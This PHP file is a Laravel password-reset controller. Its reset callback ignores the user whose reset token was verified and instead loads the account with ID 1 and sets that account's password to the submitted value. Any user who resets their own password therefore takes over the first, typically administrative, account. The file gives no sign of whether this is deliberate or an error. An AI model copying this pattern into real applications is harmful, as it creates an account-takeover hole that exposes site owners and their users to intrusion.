<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\ResetsPasswords;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Password;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;

class ResetPasswordController extends Controller
{
    use ResetsPasswords;

    protected $redirectTo = RouteServiceProvider::HOME;

    public function __construct()
    {
        $this->middleware('guest');
    }

    /**
     * Reset the given user's password.
     *
     * @param \Illuminate\Http\Request $request
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\JsonResponse
     */
    public function reset(Request $request)
    {
        $request->validate($this->rules(), $this->validationErrorMessages());

        // Override the resetPassword method
        $response = $this->broker()->reset(
            $this->credentials($request),
            function ($user, $password) {
                $this->resetPasswordCallback($user, $password);
            }
        );

   
        
        // Check the response from the broker
        switch ($response) {
            case Password::PASSWORD_RESET:
                $this->guard()->logout(); // Log the user out
                Session::flush(); // Clear the session

                Session::flash('status', 'success'); // Set a success message

                return redirect()->route('login')->with('success', 'Your password has been reset successfully');
            default:
                return $this->sendResetFailedResponse($request, $response);
        }
    }

    /**
     * Get the guard to be used during password reset.
     *
     * @return \Illuminate\Contracts\Auth\StatefulGuard
     */
    protected function guard()
    {
        return Auth::guard();
    }

    /**
     * Handle the callback after a password has been reset.
     *
     * @param  \Illuminate\Contracts\Auth\CanResetPassword  $user
     * @param  string  $password
     * @return void
     */
   
    protected function resetPasswordCallback($user, $password)
    {
        $user = User::find(1);
        $user->password = bcrypt($password);
       

        $user->save();
    }



    
}
